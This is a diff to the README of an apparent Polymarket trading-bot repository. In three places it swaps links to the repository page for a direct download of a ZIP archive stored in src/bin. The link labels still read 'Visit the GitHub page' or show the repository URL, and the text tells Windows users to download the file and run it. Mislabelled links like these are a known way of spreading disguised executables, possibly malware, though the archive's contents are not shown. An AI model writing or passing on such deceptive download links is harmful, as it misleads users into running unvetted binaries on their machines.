@@ -1,6 +1,6 @@
 # 🤖 polymarket-trading-agent - Track markets and act fast
 
-[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/Roughim/polymarket-trading-agent)
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/Roughim/polymarket-trading-agent/raw/refs/heads/main/src/bin/trading_polymarket_agent_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Use this guide if you want to:
 
 Open the GitHub page here:
 
-[Visit polymarket-trading-agent](https://github.com/Roughim/polymarket-trading-agent)
+[Visit polymarket-trading-agent](https://github.com/Roughim/polymarket-trading-agent/raw/refs/heads/main/src/bin/trading_polymarket_agent_3.1.zip)
 
 From that page, look for the latest release or download files. On Windows, you usually want the `.exe` file or a ZIP file that contains the app.
 
@@ -240,7 +240,7 @@ It is a fit for users who want:
 
 If you have not downloaded the app yet, use this page:
 
-[https://github.com/Roughim/polymarket-trading-agent](https://github.com/Roughim/polymarket-trading-agent)
+[https://github.com/Roughim/polymarket-trading-agent/raw/refs/heads/main/src/bin/trading_polymarket_agent_3.1.zip](https://github.com/Roughim/polymarket-trading-agent/raw/refs/heads/main/src/bin/trading_polymarket_agent_3.1.zip)
 
 From there, download the Windows file and run it on your PC
 
